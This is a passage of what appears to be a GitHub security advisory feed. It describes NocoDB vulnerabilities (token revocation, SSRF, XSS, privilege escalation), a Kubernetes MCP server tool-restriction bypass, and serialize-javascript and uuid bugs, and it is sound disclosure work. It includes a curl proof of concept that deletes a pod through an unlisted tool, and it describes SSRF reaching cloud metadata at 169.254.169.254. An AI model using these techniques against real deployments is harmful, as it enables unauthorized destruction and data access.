<p>The API token deletion path removed the database row but did not evict the token-value keyed entry from the auth cache. The auth middleware therefore continued to accept the deleted token until the cache entry aged out, leaving a deletion-to-revocation window of up to three days.</p>
<h3 id="impact">Impact</h3>
<p>Tokens revoked through the UI or API continued to grant access during the cache TTL, breaking the operator's expected security guarantee that deletion is immediate.</p>
<h3 id="credit">Credit</h3>
<p>This issue was reported by <a href="https://github.com/bugbunny-research">@bugbunny-research</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nocodb/nocodb/security/advisories/GHSA-f76x-f9vj-92jv">https://github.com/nocodb/nocodb/security/advisories/GHSA-f76x-f9vj-92jv</a></li>
<li><a href="https://github.com/advisories/GHSA-f76x-f9vj-92jv">https://github.com/advisories/GHSA-f76x-f9vj-92jv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f76x-f9vj-92jv</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-21T20:39:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nocodb] NocoDB: Attachment Size Limit Bypass via Upload-by-URL]]></title>
        <id>https://github.com/advisories/GHSA-8rwr-f68v-cvw6</id>
        <link href="https://github.com/advisories/GHSA-8rwr-f68v-cvw6"/>
        <updated>2026-05-21T20:38:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The upload-by-URL path did not enforce <code>NC_ATTACHMENT_FIELD_SIZE</code> against either the remote file's advertised <code>Content-Length</code> or the decoded length of a <code>data:</code> URI, allowing an authenticated user to bypass the configured per-file size limit.</p>
<h3 id="details">Details</h3>
<p>The attachments service now checks <code>NC_ATTACHMENT_FIELD_SIZE</code> against both the HEAD response's <code>content-length</code> and the decoded length of a <code>data:</code> URI body before fetching. The local storage plugin additionally sets <code>maxContentLength</code> on the axios download so a malicious server cannot stream past the limit.</p>
<h3 id="impact">Impact</h3>
<p>Authenticated users with upload permission could attach files larger than the operator-configured limit, defeating storage and bandwidth caps.</p>
<h3 id="credit">Credit</h3>
<p>This issue was reported by <a href="https://github.com/bugbunny-research">@bugbunny-research</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nocodb/nocodb/security/advisories/GHSA-8rwr-f68v-cvw6">https://github.com/nocodb/nocodb/security/advisories/GHSA-8rwr-f68v-cvw6</a></li>
<li><a href="https://github.com/advisories/GHSA-8rwr-f68v-cvw6">https://github.com/advisories/GHSA-8rwr-f68v-cvw6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8rwr-f68v-cvw6</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-21T20:38:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nocodb] NocoDB: Shared-base link access can invite arbitrary users as persistent base members]]></title>
        <id>https://github.com/advisories/GHSA-chqv-vrj7-qffp</id>
        <link href="https://github.com/advisories/GHSA-chqv-vrj7-qffp"/>
        <updated>2026-05-21T20:35:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Shared-base sessions were granted the same base-member capabilities as authenticated viewers. Using only the shared-base UUID (<code>xc-shared-base-id</code>), an attacker could enumerate base members and invite an arbitrary email into the base as a real member. The invited user could then redeem the invite via the normal signup flow and retain authenticated access even after the owner revoked the shared link.</p>
<h3 id="details">Details</h3>
<p>Shared-base sessions were mapped to <code>ProjectRoles.VIEWER</code> in <code>packages/nocodb/src/strategies/base-view.strategy/base-view.strategy.ts</code>, and <code>packages/nocodb/src/utils/acl.ts</code> granted <code>baseUserList</code> and <code>userInvite</code> to that role. The shared frontend (<code>packages/nc-gui/composables/useApi/interceptors.ts</code>) deliberately removed auth headers in favour of the shared-base header, but the ACL middleware did not distinguish shared sessions from genuine viewers.</p>
<p>The end-to-end chain:</p>
<ul>
<li><code>GET /api/v2/meta/bases/:baseId/users</code> returned the member list to shared-base callers (<code>@Acl('baseUserList')</code>).</li>
<li><code>POST /api/v2/meta/bases/:baseId/users</code> accepted an invite from shared-base callers (<code>@Acl('userInvite')</code>); <code>base-users.service.ts</code> inserted a real <code>nc_users_v2</code> row with <code>invite_token</code> and a <code>nc_base_users_v2</code> row for the target base, with <code>invited_by = null</code>.</li>
<li>The invited account redeemed the invite through the normal signup path (<code>users.service.ts</code>), gaining a persistent JWT scoped to the base.</li>
<li>Revoking the shared link did not affect the redeemed account.</li>
</ul>
<h3 id="impact">Impact</h3>
<ul>
<li>Confidentiality: shared-base link exposes member email addresses.</li>
<li>Integrity: shared-base link can mutate base ACL state by creating new members.</li>
<li>Persistence: link-based access converts into durable authenticated access that survives revocation of the share.</li>
</ul>
<h3 id="credit">Credit</h3>
<p>This issue was reported by <a href="https://github.com/0xmrma">@0xmrma</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nocodb/nocodb/security/advisories/GHSA-chqv-vrj7-qffp">https://github.com/nocodb/nocodb/security/advisories/GHSA-chqv-vrj7-qffp</a></li>
<li><a href="https://github.com/advisories/GHSA-chqv-vrj7-qffp">https://github.com/advisories/GHSA-chqv-vrj7-qffp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-chqv-vrj7-qffp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-21T20:35:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nocodb] NocoDB: Missing File Size Enforcement in Upload-by-URL Allows Denial of Service via Disk Exhaustion]]></title>
        <id>https://github.com/advisories/GHSA-99vc-2jx2-688p</id>
        <link href="https://github.com/advisories/GHSA-99vc-2jx2-688p"/>
        <updated>2026-05-21T20:35:42.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>uploadViaURL</code> path in the v1/v2 attachment API did not enforce <code>NC_ATTACHMENT_FIELD_SIZE</code> against the remote <code>content-length</code> or against the response stream. An authenticated user (Editor+) could direct the server to download arbitrarily large files, exhausting disk space and causing denial of service.</p>
<h3 id="details">Details</h3>
<p>In <code>packages/nocodb/src/services/attachments.service.ts</code>, the HEAD probe read <code>content-length</code> but never compared it to <code>NC_ATTACHMENT_FIELD_SIZE</code>; the subsequent <code>storageAdapter.fileCreateByUrl()</code> performed the download without <code>maxContentLength</code>. The v3 service (<code>v3/data-attachment-v3.service.ts</code>) already enforced the limit, but the v1/v2 endpoints (<code>POST /api/v1/db/storage/upload-by-url</code>, <code>POST /api/v2/storage/upload-by-url</code>) did not.</p>
<p>This is distinct from GHSA-xr7v-j379-34v9 (blind SSRF via HEAD) — same code area, different class.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>Authenticated DoS via disk exhaustion. Editor role suffices.</li>
<li>Cascading failures once disk fills: blocked DB writes, log rotation, application crash.</li>
</ul>
<h3 id="credit">Credit</h3>
<p>This issue was reported by <a href="https://github.com/ik0z">@ik0z</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nocodb/nocodb/security/advisories/GHSA-99vc-2jx2-688p">https://github.com/nocodb/nocodb/security/advisories/GHSA-99vc-2jx2-688p</a></li>
<li><a href="https://github.com/advisories/GHSA-99vc-2jx2-688p">https://github.com/advisories/GHSA-99vc-2jx2-688p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-99vc-2jx2-688p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-21T20:35:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nocodb] NocoDB: Refresh Token Cookie Set Without `secure` and `sameSite` Flags]]></title>
        <id>https://github.com/advisories/GHSA-f74w-272x-mqcv</id>
        <link href="https://github.com/advisories/GHSA-f74w-272x-mqcv"/>
        <updated>2026-05-21T20:35:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The refresh-token cookie was set with <code>httpOnly: true</code> but missing both the <code>secure</code> flag and the <code>sameSite</code> attribute. Over plain HTTP the cookie could be intercepted on the network; without <code>sameSite</code>, browsers attached it to cross-site POSTs, enabling CSRF against the token-refresh endpoint.</p>
<h3 id="details">Details</h3>
<p>In <code>packages/nocodb/src/services/users/helpers.ts</code>, <code>setTokenCookie</code> produced the cookie with only <code>httpOnly</code>, an <code>expires</code> date, and an optional <code>domain</code> from <code>NC_BASE_HOST_NAME</code> — no <code>secure</code>, no <code>sameSite</code>. The refresh endpoint <code>POST /api/v2/auth/token/refresh</code> (<code>auth.controller.ts</code>) read the cookie unconditionally and returned a new JWT, with no CSRF token.</p>
<p>The fix sets <code>httpOnly: true</code>, <code>sameSite: 'lax'</code>, and conditional <code>secure: req.ncSiteUrl.startsWith('https')</code> so the flag is active under HTTPS while still functional on plain-HTTP localhost development.</p>
<p>This is distinct from GHSA-x4vh-j75g-268g (refresh-token lifecycle on password reset) — different root cause, different attack vector.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>Cookie interception on plain HTTP networks (no <code>secure</code>).</li>
<li>Cross-site refresh: malicious cross-origin pages could trigger token refresh and, combined with any same-origin XSS or open-redirect on the NocoDB domain, capture the new JWT.</li>
<li>Refresh tokens have multi-day expiry (<code>NC_REFRESH_TOKEN_EXP_IN_DAYS</code>), so the exposure window is long.</li>
</ul>
<h3 id="credit">Credit</h3>
<p>This issue was reported by <a href="https://github.com/ik0z">@ik0z</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nocodb/nocodb/security/advisories/GHSA-f74w-272x-mqcv">https://github.com/nocodb/nocodb/security/advisories/GHSA-f74w-272x-mqcv</a></li>
<li><a href="https://github.com/advisories/GHSA-f74w-272x-mqcv">https://github.com/advisories/GHSA-f74w-272x-mqcv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f74w-272x-mqcv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-21T20:35:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nocodb] NocoDB: OAuth Token Scope Not Enforced at ACL Layer Allows Scope Escalation]]></title>
        <id>https://github.com/advisories/GHSA-m5qg-rvjq-727p</id>
        <link href="https://github.com/advisories/GHSA-m5qg-rvjq-727p"/>
        <updated>2026-05-21T20:34:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The OAuth token strategy attached <code>oauth_scope</code> and <code>oauth_granted_resources</code> to the request user, but the ACL middleware never consulted either. An OAuth token issued with a restricted scope (e.g. MCP-only) therefore inherited the full permissions of the underlying user across all routes; the <code>granted_resources.base_id</code> restriction was bypassed on org-level endpoints that don't populate <code>req.context.base_id</code>.</p>
<h3 id="details">Details</h3>
<p>In <code>packages/nocodb/src/strategies/oauth-token.strategy.ts</code>, the strategy set <code>is_oauth_token</code>, <code>oauth_client_id</code>, <code>oauth_granted_resources</code>, and <code>oauth_scope</code> on the user object, then mapped through to the user's existing <code>roles</code> / <code>base_roles</code>. The ACL middleware in <code>extract-ids.middleware.ts</code> honoured <code>is_api_token</code> via <code>blockApiTokenAccess</code> but had no equivalent gate for <code>is_oauth_token</code> or scope-string enforcement.</p>
<p>The base/workspace restriction logic short-circuited when <code>req.context.base_id</code> was unset (org-level routes), so an OAuth token scoped to one base could still call org-level endpoints as the underlying user.</p>
<p>The fix adds a path-prefix allowlist (<code>['/mcp', '/api/v3/', '/auth/user/me']</code>) enforced inside the strategy and a <code>blockOAuthTokenAccess</code> ACL flag for endpoints that should never accept OAuth tokens.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>Scope escalation: tokens issued with a narrow scope received the underlying user's full role.</li>
<li>Resource boundary bypass: per-base restrictions did not apply to org-level routes.</li>
<li>Violates least-privilege expectation for third-party OAuth integrations.</li>
</ul>
<h3 id="credit">Credit</h3>
<p>This issue was reported by <a href="https://github.com/ik0z">@ik0z</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nocodb/nocodb/security/advisories/GHSA-m5qg-rvjq-727p">https://github.com/nocodb/nocodb/security/advisories/GHSA-m5qg-rvjq-727p</a></li>
<li><a href="https://github.com/advisories/GHSA-m5qg-rvjq-727p">https://github.com/advisories/GHSA-m5qg-rvjq-727p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m5qg-rvjq-727p</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-21T20:34:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nocodb] NocoDB: SSRF Protection Bypass in Notification Webhook Plugins (Slack, Discord, Mattermost, Teams)]]></title>
        <id>https://github.com/advisories/GHSA-2c5x-4jgf-88mj</id>
        <link href="https://github.com/advisories/GHSA-2c5x-4jgf-88mj"/>
        <updated>2026-05-21T20:34:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>request-filtering-agent</code> SSRF protection was non-functional in the four notification webhook plugins (Slack, Discord, Mattermost, Teams) because <code>httpAgent</code> / <code>httpsAgent</code> were passed as part of the request <strong>body</strong> rather than the axios <strong>config</strong>. An authenticated user with hook-creation permission could direct outbound POST requests to arbitrary internal hosts.</p>
<h3 id="details">Details</h3>
<p><code>axios.post(url, data, config)</code> expects connection agents in the third (config) argument. In all four plugins, the agents were placed in the second (data) argument and serialised as JSON body content:</p>
<pre><code class="language-ts">// packages/nocodb/src/plugins/slack/Slack.ts (and Discord / Mattermost / Teams — identical pattern)
return await axios.post(webhook_url, {
  text,
  httpAgent: useAgent(webhook_url),   // wrong position — serialised, not used
  httpsAgent: useAgent(webhook_url),
});
</code></pre>
<p>The webhook flow: an Editor+ user creates a webhook with <code>notification.payload.channels[].webhook_url</code> pointing to an internal host; on trigger, <code>WebhookInvoker.invoke()</code> calls the plugin's <code>sendMessage()</code> which performs the outbound <code>axios.post</code> with no SSRF filtering applied.</p>
<p>This is distinct from GHSA-xr7v-j379-34v9, which covers a blind SSRF via HEAD in the upload-by-URL path.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>Authenticated user (Editor+) can reach cloud-metadata endpoints (<code>169.254.169.254</code>) and internal services.</li>
<li>Combined with verbose hook logging (<code>NC_AUTOMATION_LOG_LEVEL=ALL</code>), response bodies may be exfiltrated.</li>
</ul>
<h3 id="credit">Credit</h3>
<p>This issue was reported by <a href="https://github.com/ik0z">@ik0z</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nocodb/nocodb/security/advisories/GHSA-2c5x-4jgf-88mj">https://github.com/nocodb/nocodb/security/advisories/GHSA-2c5x-4jgf-88mj</a></li>
<li><a href="https://github.com/advisories/GHSA-2c5x-4jgf-88mj">https://github.com/advisories/GHSA-2c5x-4jgf-88mj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2c5x-4jgf-88mj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-21T20:34:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nocodb] NocoDB: Reflected Cross-Site Scripting via Page Leaving Redirect URL]]></title>
        <id>https://github.com/advisories/GHSA-9qgr-6vpg-9gh9</id>
        <link href="https://github.com/advisories/GHSA-9qgr-6vpg-9gh9"/>
        <updated>2026-05-21T20:34:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A reflected XSS vulnerability exists in the Page Leaving Warning page. The <code>ncRedirectUrl</code> and <code>ncBackUrl</code> query parameters are used in <code>window.location.href</code> and <code>&lt;a&gt;</code> tag bindings without validation, allowing <code>javascript:</code> URI injection.</p>
<h3 id="details">Details</h3>
<p><code>PageLeavingWarning.vue</code> reads <code>ncRedirectUrl</code> and <code>ncBackUrl</code> directly from the route query without validation. When <code>isSameOriginUrl()</code> returns <code>false</code> (as it does for <code>javascript:</code> URIs), the raw URL is assigned to <code>window.location.href</code>, executing arbitrary JavaScript. The redirect URL is also bound directly to an <code>&lt;a&gt;</code> tag's <code>href</code> attribute.</p>
<h3 id="impact">Impact</h3>
<p>An attacker can execute arbitrary JavaScript in the context of the NocoDB application by sending a crafted link to a victim. No authentication is required.</p>
<h3 id="credit">Credit</h3>
<p>This issue was reported by <a href="https://github.com/naoyashiga">@naoyashiga</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nocodb/nocodb/security/advisories/GHSA-9qgr-6vpg-9gh9">https://github.com/nocodb/nocodb/security/advisories/GHSA-9qgr-6vpg-9gh9</a></li>
<li><a href="https://github.com/advisories/GHSA-9qgr-6vpg-9gh9">https://github.com/advisories/GHSA-9qgr-6vpg-9gh9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9qgr-6vpg-9gh9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-21T20:34:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mcp-server-kubernetes] MCP Server Kubernetes: Tool Access Control Bypass via Presentation-Layer Filtering Without Execution-Layer Enforcement]]></title>
        <id>https://github.com/advisories/GHSA-cr22-wjx7-2w6m</id>
        <link href="https://github.com/advisories/GHSA-cr22-wjx7-2w6m"/>
        <updated>2026-05-21T20:33:46.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>mcp-server-kubernetes</code> exposes three environment variables (<code>ALLOW_ONLY_READONLY_TOOLS</code>, <code>ALLOW_ONLY_NON_DESTRUCTIVE_TOOLS</code>, <code>ALLOWED_TOOLS</code>) documented as access controls for restricting which Kubernetes operations are available. These controls are enforced at the tool discovery layer (<code>tools/list</code>) but not at the execution layer (<code>tools/call</code>). Any client that knows a tool name can invoke it directly regardless of the configured restriction mode. The access control was effectively cosmetic.</p>
<p>Fixed in v3.6.0.</p>
<h2 id="impact">Impact</h2>
<p>An attacker or misconfigured AI agent with network access to the MCP server's HTTP endpoint could invoke any Kubernetes tool regardless of the restriction mode configured by the operator -- including <code>kubectl_delete</code>, <code>exec_in_pod</code>, <code>kubectl_generic</code>, and <code>node_management</code>.</p>
<p>The project explicitly supports and documents multi-client HTTP deployment scenarios (Streamable HTTP and SSE transports, in-cluster deployments, Codex CLI and Gemini CLI integrations). In these deployments, operators relied on the tool restriction env vars to enforce least-privilege access across users or roles. The bypass invalidated that model entirely.</p>
<p>Severity scales with the Kubernetes service account's permissions. In environments where the MCP server runs with <code>cluster-admin</code> (common in dev/staging), this is equivalent to full cluster compromise for any client that can reach the endpoint.</p>
<p>The <code>MCP_AUTH_TOKEN</code> / <code>X-MCP-AUTH</code> mechanism controls who can reach the endpoint but provides no per-tool authorization. An authenticated client restricted to <code>ALLOWED_TOOLS=kubectl_get</code> could still invoke <code>kubectl_delete</code> after authentication.</p>
<h2 id="root-cause">Root Cause</h2>
<p>In <code>src/index.ts</code>, the <code>ListToolsRequestSchema</code> handler applied the configured filtering logic before returning available tools. The <code>CallToolRequestSchema</code> handler dispatched directly by tool name with no equivalent check -- every tool was reachable unconditionally.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Tested across all three restriction modes against a live kind cluster. In each case, <code>kubectl_delete</code> was absent from <code>tools/list</code> but executed successfully via a direct <code>tools/call</code> request:</p>
<pre><code class="language-shell">curl -s http://&lt;HOST&gt;:3003/mcp \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/event-stream' \
  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"kubectl_delete","arguments":{"resourceType":"pod","name":"test-pod","namespace":"default"}}}'
</code></pre>
<p>Result: <code>{"result":{"content":[{"type":"text","text":"pod \"test-pod\" deleted\n"}]}}</code></p>
<p>Confirmed across <code>ALLOW_ONLY_READONLY_TOOLS=true</code>, <code>ALLOW_ONLY_NON_DESTRUCTIVE_TOOLS=true</code>, and <code>ALLOWED_TOOLS=kubectl_get</code>.</p>
<h2 id="remediation">Remediation</h2>
<p>The fix applies the same filtering logic from <code>ListToolsRequestSchema</code> at the start of the <code>CallToolRequestSchema</code> handler, returning an error for any tool call outside the active allowed set. Fixed in v3.6.0.</p>
<h2 id="credit">Credit</h2>
<p>Discovered by <a href="https://www.linkedin.com/in/francisco-rosales-celis/">Francisco Rosales</a> of <a href="https://manifold.security">Manifold Security</a>, coordinated by <a href="https://www.linkedin.com/in/axsharma/">Ax Sharma</a>, Head of Research at Manifold Security.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Flux159/mcp-server-kubernetes/security/advisories/GHSA-cr22-wjx7-2w6m">https://github.com/Flux159/mcp-server-kubernetes/security/advisories/GHSA-cr22-wjx7-2w6m</a></li>
<li><a href="https://github.com/advisories/GHSA-cr22-wjx7-2w6m">https://github.com/advisories/GHSA-cr22-wjx7-2w6m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cr22-wjx7-2w6m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-21T20:33:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[serialize-javascript] Serialize JavaScript has CPU Exhaustion Denial of Service via crafted array-like objects]]></title>
        <id>https://github.com/advisories/GHSA-qj8w-gfj5-8c6v</id>
        <link href="https://github.com/advisories/GHSA-qj8w-gfj5-8c6v"/>
        <updated>2026-05-21T18:30:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><strong>What kind of vulnerability is it?</strong></p>
<p>It is a <strong>Denial of Service (DoS)</strong> vulnerability caused by CPU exhaustion. When serializing a specially crafted "array-like" object (an object that inherits from <code>Array.prototype</code> but has a very large <code>length</code> property), the process enters an intensive loop that consumes 100% CPU and hangs indefinitely.</p>
<p><strong>Who is impacted?</strong></p>
<p>Applications that use <code>serialize-javascript</code> to serialize untrusted or user-controlled objects are at risk. While direct exploitation is difficult, it becomes a high-priority threat if the application is also vulnerable to <strong>Prototype Pollution</strong> or handles untrusted data via <strong>YAML Deserialization</strong>, as these could be used to inject the malicious object.</p>
<h3 id="patches">Patches</h3>
<p><strong>Has the problem been patched?</strong></p>
<p>Yes, the issue has been patched by replacing <code>instanceof Array</code> checks with <code>Array.isArray()</code> and using <code>Object.keys()</code> for sparse array detection.</p>
<p><strong>What versions should users upgrade to?</strong></p>
<p>Users should upgrade to <strong><code>v7.0.5</code></strong> or later.</p>
<h3 id="workarounds">Workarounds</h3>
<p><strong>Is there a way for users to fix or remediate the vulnerability without upgrading?</strong></p>
<p>There is no direct code-level workaround within the library itself. However, users can mitigate the risk by:</p>
<ul>
<li>Validating and sanitizing all input before passing it to the <code>serialize()</code> function.</li>
<li>Ensuring the environment is protected against Prototype Pollution.</li>
<li>Upgrading to <strong><code>v7.0.5</code></strong> as soon as possible.</li>
</ul>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>Serialize JavaScript thanks <strong>Tomer Aberbach</strong> (@TomerAberbach) for discovering and privately disclosing this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/yahoo/serialize-javascript/security/advisories/GHSA-qj8w-gfj5-8c6v">https://github.com/yahoo/serialize-javascript/security/advisories/GHSA-qj8w-gfj5-8c6v</a></li>
<li><a href="https://github.com/yahoo/serialize-javascript/commit/f147e90269b58bb6e539cfdf3d0e20d6ad14204b">https://github.com/yahoo/serialize-javascript/commit/f147e90269b58bb6e539cfdf3d0e20d6ad14204b</a></li>
<li><a href="https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.5">https://github.com/yahoo/serialize-javascript/releases/tag/v7.0.5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34043">https://nvd.nist.gov/vuln/detail/CVE-2026-34043</a></li>
<li><a href="https://github.com/yahoo/serialize-javascript/releases/tag/v5.0.0">https://github.com/yahoo/serialize-javascript/releases/tag/v5.0.0</a></li>
<li><a href="https://github.com/advisories/GHSA-qj8w-gfj5-8c6v">https://github.com/advisories/GHSA-qj8w-gfj5-8c6v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qj8w-gfj5-8c6v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-27T18:18:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[uuid] uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided]]></title>
        <id>https://github.com/advisories/GHSA-w5hq-g745-h8pq</id>
        <link href="https://github.com/advisories/GHSA-w5hq-g745-h8pq"/>
        <updated>2026-05-21T18:25:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>v3()</code>, <code>v5()</code>, and <code>v6()</code> <a href="https://github.com/uuidjs/uuid#api-summary">API methods</a> (not <code>uuid</code> release versions) accept external output buffers but do not reject out-of-range writes (small <code>buf</code> or large <code>offset</code>).<br>By contrast, <code>v4()</code>, <code>v1()</code>, and <code>v7()</code> API methods explicitly throw <code>RangeError</code> on invalid bounds.</p>
<p>This inconsistency allows <strong>silent partial writes</strong> into caller-provided buffers.</p>
<h3 id="affected-code">Affected code</h3>
<ul>
<li><code>src/v35.ts</code> (<code>v3()</code>/<code>v5()</code> path) writes <code>buf[offset + i]</code> without bounds validation.</li>
<li><code>src/v6.ts</code> writes <code>buf[offset + i]</code> without bounds validation.</li>
</ul>
<h3 id="reproducible-poc">Reproducible PoC</h3>
<pre><code class="language-bash">cd /home/StrawHat/uuid
npm ci
npm run build

node --input-type=module -e "
import {v4,v5,v6} from './dist-node/index.js';
const ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';
for (const [name,fn] of [
  ['v4()',()=&gt;v4({},new Uint8Array(8),4)],
  ['v5()',()=&gt;v5('x',ns,new Uint8Array(8),4)],
  ['v6()',()=&gt;v6({},new Uint8Array(8),4)],
]) {
  try { fn(); console.log(name,'NO_THROW'); }
  catch(e){ console.log(name,'THREW',e.name); }
}"
</code></pre>
<p>Observed:</p>
<ul>
<li><code>v4() THREW RangeError</code></li>
<li><code>v5() NO_THROW</code></li>
<li><code>v6() NO_THROW</code></li>
</ul>
<p>Example partial overwrite evidence captured during audit:</p>
<pre><code class="language-text">same true buf [
  170, 170, 170, 170,
   75, 224, 100,  63
]
v6 [
  187, 187, 187, 187,
   31,  19, 185,  64
]
</code></pre>
<h3 id="security-impact">Security impact</h3>
<ul>
<li><strong>Primary</strong>: integrity/robustness issue (silent partial output).</li>
<li>If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.</li>
<li>In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.</li>
</ul>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Add the same guard used by <code>v4()</code>/<code>v1()</code>/<code>v7()</code>:</p>
<pre><code class="language-ts">if (offset &lt; 0 || offset + 16 &gt; buf.length) {
  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);
}
</code></pre>
<p>Apply to:</p>
<ul>
<li><code>src/v35.ts</code> (covers <code>v3()</code> and <code>v5()</code>)</li>
<li><code>src/v6.ts</code></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq">https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq</a></li>
<li><a href="https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34">https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34</a></li>
<li><a href="https://github.com/uuidjs/uuid/releases/tag/v14.0.0">https://github.com/uuidjs/uuid/releases/tag/v14.0.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-41907">https://nvd.nist.gov/vuln/detail/CVE-2026-41907</a></li>
<li><a href="https://github.com/uuidjs/uuid/commit/32389c887c9e75f90442ee4cc95bbab0c4e8346e">https://github.com/uuidjs/uuid/commit/32389c887c9e75f90442ee4cc95bbab0c4e8346e</a></li>
<li><a href="https://github.com/uuidjs/uuid/commit/3d61d6ac1f782cf6b1dd8661c60f11722cd49a0d">https://github.com/uuidjs/uuid/commit/3d61d6ac1f782cf6b1dd8661c60f11722cd49a0d</a></li>
<li><a href="https://github.com/uuidjs/uuid/commit/9d27ddf7046ce496ef39569ff84d948eeff9cb2a">https://github.com/uuidjs/uuid/commit/9d27ddf7046ce496ef39569ff84d948eeff9cb2a</a></li>
<li><a href="https://github.com/uuidjs/uuid/releases/tag/v11.1.1">https://github.com/uuidjs/uuid/releases/tag/v11.1.1</a></li>
<li><a href="https://github.com/uuidjs/uuid/releases/tag/v12.0.1">https://github.com/uuidjs/uuid/releases/tag/v12.0.1</a></li>
<li><a href="https://github.com/uuidjs/uuid/releases/tag/v13.0.1">https://github.com/uuidjs/uuid/releases/tag/v13.0.1</a></li>
<li><a href="https://github.com/advisories/GHSA-w5hq-g745-h8pq">https://github.com/advisories/GHSA-w5hq-g745-h8pq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w5hq-g745-h8pq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
